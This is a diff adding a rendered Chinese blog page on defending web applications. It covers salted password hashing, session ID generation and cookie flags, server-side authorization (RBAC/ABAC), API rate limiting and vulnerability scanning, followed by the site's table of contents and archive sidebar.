+<tr>
+<td>bcrypt</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>SHA-1</td>
+<td>No</td>
+</tr>
+<tr>
+<td>SHA-2</td>
+<td>No</td>
+</tr>
+<tr>
+<td>MD5</td>
+<td>No</td>
+</tr>
+<tr>
+<td>PBKDF2</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Argon2</td>
+<td>watch (see sidebar)</td>
+</tr>
+</tbody>
+</table>
+<p>光使用了安全的Hash算法还不够，因为有些用户可能会使用较为简单的字符串作为密码。即便黑客无法通过Hash值反向算出原文，当他们获取到Hash值后，他们也能通过正向匹配常见字符串的方式破解一部分用户的密码。</p>
+<p>此时，我们可以给每位用户生成一个随机字符串，称作”盐“（salt），掺入密码原文再进行Hash计算。这一措施使得Hash值多了一些不确定性，无法再通过正向运算破解了。</p>
+<p>OWASP组织推荐使用32bit或64bit的字符串作为盐值。</p>
+<blockquote>
+<p>小Trick：你在存储用户的密码时，可以同时存储运用的算法标识，这一操作使你的密码系统具有了可演进性，可以支持不同时期的用户使用不同的加密规则。</p>
+</blockquote>
+<p>这里提一句算法和秘钥的安全管理：当团队规模逐渐变大时，我们需要妥善保管加密算法和秘钥，否则可能会被泄漏出去。可选的策略是将加解密算法做成一套独立的服务，供其他服务调用。在此基础上，再将秘钥分片、分布式存储、定时更新，防止系统用户轻易地拿到秘钥。</p>
+<h4 id="最佳实践-3"><a href="#最佳实践-3" class="headerlink" title="最佳实践"></a>最佳实践</h4><ul>
+<li>存储密码的Hash值，使用安全的算法</li>
+<li>给Hash值加把盐</li>
+<li>配置可演进算法版本的密码表</li>
+<li>不要存储外部服务的密码</li>
+<li>密码的长度不能太短，要制定密码的形式规范</li>
+<li>实现秘钥安全管理</li>
+</ul>
+<hr>
+<h3 id="【验证身份】正确验证用户身份和管理Session"><a href="#【验证身份】正确验证用户身份和管理Session" class="headerlink" title="【验证身份】正确验证用户身份和管理Session"></a>【验证身份】正确验证用户身份和管理Session</h3><p>先明确两个概念：</p>
+<blockquote>
+<p>Authentication-验证：证明用户的身份和他声称的一致</p>
+<p>Authorization-鉴权：判断用户是否有权限执行某项操作</p>
+</blockquote>
+<p>本节说的是Authentication，验证用户身份。</p>
+<p><strong>验证身份</strong> 和 <strong>用户Session管理</strong> 有着密不可分的关系，所以本节其实主要围绕<strong>Session管理</strong>展开。</p>
+<h4 id="什么是Session"><a href="#什么是Session" class="headerlink" title="什么是Session?"></a>什么是Session?</h4><p>用户首次访问网站时，处于未登录状态，这时我们只知道他是一个普通的访客，并为他提供登录的入口。当他成功登录后，服务端为他生成一个标识并开始在客户端和服务端之间传递，这个标识作为此后识别这名用户的依据，就是<strong>SessionID</strong>。</p>
+<p>同时，服务端保持着这个用户的一些与业务相关的临时状态，称为<strong>session</strong>，其中包含<strong>SessionID</strong>。</p>
+<p>为了保证安全，<strong>SessionID</strong>必须满足 <strong>不可预期</strong>、<strong>唯一</strong>、<strong>保密</strong>。</p>
+<h4 id="登录方式都有哪些？"><a href="#登录方式都有哪些？" class="headerlink" title="登录方式都有哪些？"></a>登录方式都有哪些？</h4><p>除了用户名密码的登录方式，还有：</p>
+<ul>
+<li>手机号码</li>
+<li>指纹</li>
+</ul>
+<ul>
+<li>SSO单点登录等</li>
+</ul>
+<blockquote>
+<p>这里提一句SSO(单点登录)：指使用用户已存在的账号进行身份验证，免去重新注册账号的麻烦。</p>
+<p>如某些网站或App上提供：微信登录、QQ登录、Github登录等。</p>
+<p>SSO的登录方式应用广泛，我想单独总结一篇博客，本节讨论的主要是session管理问题，不太关心具体登录方式，就先不展开了。</p>
+</blockquote>
+<h4 id="如何生成SessionID？"><a href="#如何生成SessionID？" class="headerlink" title="如何生成SessionID？"></a>如何生成SessionID？</h4><p>SessionID最好是不可预期的值，不建议使用有意义的值（如用户ID）进行拼接。因为攻击者可能会尝试理解SessionID的生成规则，并使用自创的SessionID去试图盗取别的用户的信息。</p>
+<p>避免这种事情发生的方式就是使用随机数。</p>
+<p>OWASP组织建议使用128bits的SessionID，可以使用SecureRandom类进行生成。</p>
+<blockquote>
+<p>除了SessionID，尽量不要在客户端Cookie里存储其它用户信息，因为任何来自用户端的参数都可能被篡改。</p>
+<p>如果必须存储，则在回传给服务端时，要有加密、验证手段防止信息被篡改</p>
+</blockquote>
+<p>SessionID必须唯一，在分布式环境下，该如何生成唯一的SessionID呢？待调研、明确</p>
+<h4 id="如何保证SessionID不被暴露？"><a href="#如何保证SessionID不被暴露？" class="headerlink" title="如何保证SessionID不被暴露？"></a>如何保证SessionID不被暴露？</h4><p>传输：在传输时必须采用HTTPS协议。</p>
+<p>前端：建议只把SessionID保存在Cookie中，不要在URL、referrer、Headers中出现</p>
+<p>后端：不要在Log中打印SessionID</p>
+<p>正确设置Cookie四个属性：</p>
+<ul>
+<li>domain：它本身和它的子域名可用，范围越窄越好</li>
+<li>path：它本身和它的子路径可用，范围越窄越好</li>
+<li>secure：<strong>必要！</strong>设置后，只有HTTPS连接才会传输该cookie</li>
+<li>httponly：<strong>必要！</strong>设置后，js代码无法读取该cookie，防止被盗。</li>
+</ul>
+<h4 id="维护Session的生命周期"><a href="#维护Session的生命周期" class="headerlink" title="维护Session的生命周期"></a>维护Session的生命周期</h4><ul>
+<li><p>每次验证身份后，新建一个SessionID，决不能复用SessionID，如：发现用户登录状态失效，在他再次登录后沿用上次的ID。</p>
+</li>
+<li><p>给Session设置合理的过期时间，依据业务类型</p>
+</li>
+<li><p>给用户提供logout的功能，并在其logout后将cookie置于过期</p>
+<ul>
+<li><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span>: sessionId=[top secret value]; path=/secret/; secure; HttpOnly;</span><br><span class="line">  domain=payments.martinfowler.com; expires=Thu, 01 Jan 1970 00:00:00 GMT</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>给用户kill all session的方法，如：在修改密码后</p>
+</li>
+<li><p>给用户列出all active sessions</p>
+</li>
+</ul>
+<h4 id="最佳实践-4"><a href="#最佳实践-4" class="headerlink" title="最佳实践"></a>最佳实践</h4><ul>
+<li>在重要操作之前再次验证用户身份，不要直接使用Session<ul>
+<li>如：阿里云在释放服务器资源时，会要求重新验证手机号/验证码</li>
+</ul>
+</li>
+<li>使用二元验证方式，引入第二种验证机制，加强安全性<ul>
+<li>如：账号密码+手机验证码</li>
+</ul>
+</li>
+<li>不要返回暴露用户是否存在的信息<ul>
+<li>在登录时，返回”用户名或密码错误“，而不是”用户不存在“</li>
+<li>在注册时，向用户邮箱发送邮件，而不是直接返回”用户已存在“的信息</li>
+</ul>
+</li>
+<li>不要将密码硬编码进程序 或 持续使用默认密码<ul>
+<li>用户第一次登陆后就要求设置新密码并作废默认密码</li>
+</ul>
+</li>
+<li>正确地生成、保护SessionID；维护Session的生命周期</li>
+<li>可以借助一些框架完成身份验证和session管理功能<ul>
+<li>如Apache Shiro、Spring Security等</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="【权限校验】验证用户有权进行某种操作"><a href="#【权限校验】验证用户有权进行某种操作" class="headerlink" title="【权限校验】验证用户有权进行某种操作"></a>【权限校验】验证用户有权进行某种操作</h3><p>说完验证用户身份的方法，再讲一讲如何验证用户的操作权限。</p>
+<p>实际上鉴权功能的实现和业务逻辑的关系很大，不同的业务场景下的权限分配逻辑大不相同。</p>
+<p>在这里只能说一下<strong>注意事项</strong> 和 <strong>权限系统的设计模式</strong>。</p>
+<h4 id="注意：只在后端做权限验证"><a href="#注意：只在后端做权限验证" class="headerlink" title="注意：只在后端做权限验证"></a>注意：只在后端做权限验证</h4><p>思路和前文类似，客户端传来的信息可能被篡改，因此不要把任何权限信息放在前端。</p>
+<h4 id="注意：实现默认拒绝的策略"><a href="#注意：实现默认拒绝的策略" class="headerlink" title="注意：实现默认拒绝的策略"></a>注意：实现默认拒绝的策略</h4><p>为了避免程序实现中的BUG，默认拒绝所有操作请求，并在鉴权成功后再放行，能最大程度避免BUG带来的破坏。</p>
+<h4 id="注意：权限的粒度"><a href="#注意：权限的粒度" class="headerlink" title="注意：权限的粒度"></a>注意：权限的粒度</h4><p>权限控制的粒度可能是全系统的，也可能针对单个资源（文件、用户数据）。实现时要注意。</p>
+<blockquote>
+<p>举例：</p>
+<p>全系统：删除用户的权限、添加用户的权限等</p>
+<p>单个资源：修改用户自己的属性、修改某个文件等</p>
+</blockquote>
+<h4 id="注意：前端缓存策略"><a href="#注意：前端缓存策略" class="headerlink" title="注意：前端缓存策略"></a>注意：前端缓存策略</h4><p>如果用户共用浏览器，前端缓存策略可能导致页面显示和权限不符。注意禁止页面缓存：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: private, no-cache, no-store</span><br></pre></td></tr></table></figure>
+<h4 id="模式：RBAC（role-based-access-control）"><a href="#模式：RBAC（role-based-access-control）" class="headerlink" title="模式：RBAC（role based access control）"></a>模式：RBAC（role based access control）</h4><p>指在系统中抽象出<strong>role</strong>和<strong>permission</strong>两种实体，分别代表角色和权限，E-R图：</p>
+<p><img src="http://onpyrjcca.bkt.clouddn.com/WX20180421-151314.png" alt=""></p>
+<p>验证时：根据用户身份判断他是否有对应的permission。</p>
+<p>模式适用场景：</p>
+<ul>
+<li>权限类型数量相对固定</li>
+<li>角色与权限的映射关系在手动维护的范围之内，不会出现人-权限的大规模自由动态组合。</li>
+</ul>
+<h4 id="模式：ABAC（attribute-based-access-control）"><a href="#模式：ABAC（attribute-based-access-control）" class="headerlink" title="模式：ABAC（attribute based access control）"></a>模式：ABAC（attribute based access control）</h4><p>比RBAC更加复杂，但是可以支持权限动态组合，适合角色-权限映射关系不固定的系统。</p>
+<p>实现方法包括XACML 和 DSL，不详细说了。</p>
+<h4 id="框架：简化代码"><a href="#框架：简化代码" class="headerlink" title="框架：简化代码"></a>框架：简化代码</h4><p>考虑使用类似Spring Security框架的声明式鉴权过程</p>
+<hr>
+<h3 id="【防止恶意访问】防接口被刷-amp-风控"><a href="#【防止恶意访问】防接口被刷-amp-风控" class="headerlink" title="【防止恶意访问】防接口被刷&amp;风控"></a>【防止恶意访问】防接口被刷&amp;风控</h3><p>《阿里巴巴开发手册》中几次提到了<strong>”放刷“</strong>：</p>
+<blockquote>
+<p>“在使用平台资源，譬如短信、邮件、电话、下单、支付，必须实现正确的防重放限制，如数量限制、疲劳度控制、验证码校验，避免被滥刷、资损。”</p>
+<p>“说明:如注册时发送验证码到手机，如果没有限制次数和频率，那么可以利用此功能<strong>骚扰</strong>到其它用户，并造成短信平台资源浪费。”</p>
+<p>“发贴、评论、发送即时消息等用户生成内容的场景必须实现防刷、文本内容违禁词过滤等风控策略。”</p>
+</blockquote>
+<p>这里提一下接口防刷的策略：</p>
+<ul>
+<li>前端：在提交请求前设置验证码，限制提交次数和提交频率</li>
+<li>后端：通过IP地址或其他用户标识做访问频率限制<ul>
+<li>一方面前端的限制可能被绕过，后端防刷是必要的</li>
+<li>这一功能可以尽量提前，不要让过量请求进入到后端应用服务器，最好在网关或者代理层就拦截掉。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="【漏洞】扫描系统和软件漏洞"><a href="#【漏洞】扫描系统和软件漏洞" class="headerlink" title="【漏洞】扫描系统和软件漏洞"></a>【漏洞】扫描系统和软件漏洞</h3><p>我们使用的服务器操作系统、软件都可能存在漏洞，定期使用漏洞扫描工具可以排查出一些问题，是持续加固网站安全性的一种方法。</p>
+<p>阿里云本身也提供了安全漏洞方面的工具，便于排查，我们也可以主动使用起来。</p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/04/23/Spring-Cloud-Config-配置中心/" title= Spring Cloud Config 配置中心 >
+                    <div class="nextTitle">Spring Cloud Config 配置中心</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/04/20/Spring-Cloud-Zuul-网关（二）/" title= Spring Cloud Zuul 网关（二） >
+                    <div class="prevTitle">Spring Cloud Zuul 网关（二）</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="//github.com/zhilehuo" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#互联网应用安全威胁的应对"><span class="toc-number">1.</span> <span class="toc-text">互联网应用安全威胁的应对</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#【输入】有效验证用户输入参数-拒绝非法输入参数"><span class="toc-number">1.0.1.</span> <span class="toc-text">【输入】有效验证用户输入参数 / 拒绝非法输入参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-XSS（Cross-Site-Script）攻击"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">1. XSS（Cross Site Script）攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-拒绝服务（Denial-of-Service）攻击"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">2. 拒绝服务（Denial of Service）攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-注入攻击"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">3. 注入攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-CSRF"><span class="toc-number">1.0.1.4.</span> <span class="toc-text">4. CSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-资源盗链"><span class="toc-number">1.0.1.5.</span> <span class="toc-text">5. 资源盗链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-垃圾信息"><span class="toc-number">1.0.1.6.</span> <span class="toc-text">6. 垃圾信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#最佳实践"><span class="toc-number">1.0.1.7.</span> <span class="toc-text">最佳实践</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【输出】输出安全过滤后的用户数据"><span class="toc-number">1.0.2.</span> <span class="toc-text">【输出】输出安全过滤后的用户数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#最佳实践-1"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">最佳实践</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【数据库】使用参数绑定防止SQL注入"><span class="toc-number">1.0.3.</span> <span class="toc-text">【数据库】使用参数绑定防止SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#最佳实践-2"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">最佳实践</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【传输】全面使用HTTPS"><span class="toc-number">1.0.4.</span> <span class="toc-text">【传输】全面使用HTTPS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-如何申请HTTPS证书？"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">1. 如何申请HTTPS证书？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-全面使用HTTPS是否会给服务器带来性能压力？"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">2.全面使用HTTPS是否会给服务器带来性能压力？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-如何阻止用户继续使用HTTP？"><span class="toc-number">1.0.4.3.</span> <span class="toc-text">3.如何阻止用户继续使用HTTP？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-还有那些最佳实践？"><span class="toc-number">1.0.4.4.</span> <span class="toc-text">4. 还有那些最佳实践？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-如何检测我网站的HTTPS安全性？"><span class="toc-number">1.0.4.5.</span> <span class="toc-text">5.如何检测我网站的HTTPS安全性？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【密码】加密存储用户密码"><span class="toc-number">1.0.5.</span> <span class="toc-text">【密码】加密存储用户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#最佳实践-3"><span class="toc-number">1.0.5.1.</span> <span class="toc-text">最佳实践</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【验证身份】正确验证用户身份和管理Session"><span class="toc-number">1.0.6.</span> <span class="toc-text">【验证身份】正确验证用户身份和管理Session</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#什么是Session"><span class="toc-number">1.0.6.1.</span> <span class="toc-text">什么是Session?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#登录方式都有哪些？"><span class="toc-number">1.0.6.2.</span> <span class="toc-text">登录方式都有哪些？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#如何生成SessionID？"><span class="toc-number">1.0.6.3.</span> <span class="toc-text">如何生成SessionID？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#如何保证SessionID不被暴露？"><span class="toc-number">1.0.6.4.</span> <span class="toc-text">如何保证SessionID不被暴露？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#维护Session的生命周期"><span class="toc-number">1.0.6.5.</span> <span class="toc-text">维护Session的生命周期</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#最佳实践-4"><span class="toc-number">1.0.6.6.</span> <span class="toc-text">最佳实践</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【权限校验】验证用户有权进行某种操作"><span class="toc-number">1.0.7.</span> <span class="toc-text">【权限校验】验证用户有权进行某种操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#注意：只在后端做权限验证"><span class="toc-number">1.0.7.1.</span> <span class="toc-text">注意：只在后端做权限验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注意：实现默认拒绝的策略"><span class="toc-number">1.0.7.2.</span> <span class="toc-text">注意：实现默认拒绝的策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注意：权限的粒度"><span class="toc-number">1.0.7.3.</span> <span class="toc-text">注意：权限的粒度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注意：前端缓存策略"><span class="toc-number">1.0.7.4.</span> <span class="toc-text">注意：前端缓存策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#模式：RBAC（role-based-access-control）"><span class="toc-number">1.0.7.5.</span> <span class="toc-text">模式：RBAC（role based access control）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#模式：ABAC（attribute-based-access-control）"><span class="toc-number">1.0.7.6.</span> <span class="toc-text">模式：ABAC（attribute based access control）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#框架：简化代码"><span class="toc-number">1.0.7.7.</span> <span class="toc-text">框架：简化代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【防止恶意访问】防接口被刷-amp-风控"><span class="toc-number">1.0.8.</span> <span class="toc-text">【防止恶意访问】防接口被刷&amp;风控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【漏洞】扫描系统和软件漏洞"><span class="toc-number">1.0.9.</span> <span class="toc-text">【漏洞】扫描系统和软件漏洞</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 29 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2018/04/23/Spring-Cloud-Config-配置中心/" >Spring Cloud Config 配置中心</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href= "/2018/04/20/互联网安全问题/" >互联网应用安全威胁及应对方法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href= "/2018/04/20/Spring-Cloud-Zuul-网关（二）/" >Spring Cloud Zuul 网关（二）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2018/04/17/Spring-Cloud-Zuul-网关（一）/" >Spring Cloud Zuul 网关（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2018/04/13/Spring-Cloud-Feign-声明式服务调用/" >Spring Cloud Feign 声明式服务调用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2018/04/09/Hexo + Github 搭建博客/" >Hexo + Github 搭建博客</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2018/04/09/Spring-Cloud-Hystrix-容错保护/" >Spring Cloud Hystrix 容错保护</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2018/03/21/Spring-Cloud-Ribbon-客户端负载均衡/" >Spring Cloud Ribbon 客户端负载均衡</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2018/03/20/Spring-Cloud-Eureka-服务治理/" >Spring Cloud Eureka 服务治理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2018/03/10/Spring-Cloud-简介/" >Spring Cloud 简介</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/12</span><a class="archive-post-title" href= "/2017/12/12/Git 操作指南/" >Git 操作指南</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2017/10/26/DNS 服务 bind 配置说明/" >DNS 服务 bind 配置说明</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2017/10/26/Vue 介绍/" >Vue 介绍</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2017/09/11/Java 8 中的日期时间 API/" >Java 8 中的日期时间 API</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2017/07/12/Jetty UrlRewrite 使用/" >Jetty UrlRewrite 使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/2017/05/22/主 app 性能测试总结/" >主 app 性能测试总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span><a class="archive-post-title" href= "/2017/05/19/公众号菜单网页授权功能/" >公众号菜单网页授权功能</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2017/05/12/狼人杀新手教科书/" >狼人杀新手教科书</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2017/05/09/初识 Zookeeper/" >初识 Zookeeper</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/08</span><a class="archive-post-title" href= "/2017/05/08/Hibernate学习笔记（易）/" >Hibernate学习笔记（易）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2017/05/03/Jetty 容器实例部署时的问题解决方法/" >jetty 容器实例部署时的问题解决方法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span><a class="archive-post-title" href= "/2017/04/28/ProxySQL 调研记录/" >ProxySQL 调研记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span><a class="archive-post-title" href= "/2017/04/28/Servlet 从入门到实战/" >Servlet 从入门到实战</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span><a class="archive-post-title" href= "/2017/04/28/Shell 编程简介/" >Shell 编程简介</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href= "/2017/04/20/SSL 认证体系备忘录/" >SSL 认证体系备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2017/04/17/Markdown-简明教程/" >Markdown 简明教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href= "/2017/04/14/Xcode 自动批量打包脚本使用方法/" >Xcode 自动批量打包脚本使用方法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2017/04/01/Maven 从陌生到入门/" >Maven 从陌生到入门</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2017/04/01/Jetty 概览/" >Jetty 概览</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="DNS"><span class="iconfont-archer">&#xe606;</span>DNS</span>
+    
+        <span class="sidebar-tag-name" data-tags="Git"><span class="iconfont-archer">&#xe606;</span>Git</span>
+    
+        <span class="sidebar-tag-name" data-tags="Hexo"><span class="iconfont-archer">&#xe606;</span>Hexo</span>
+    
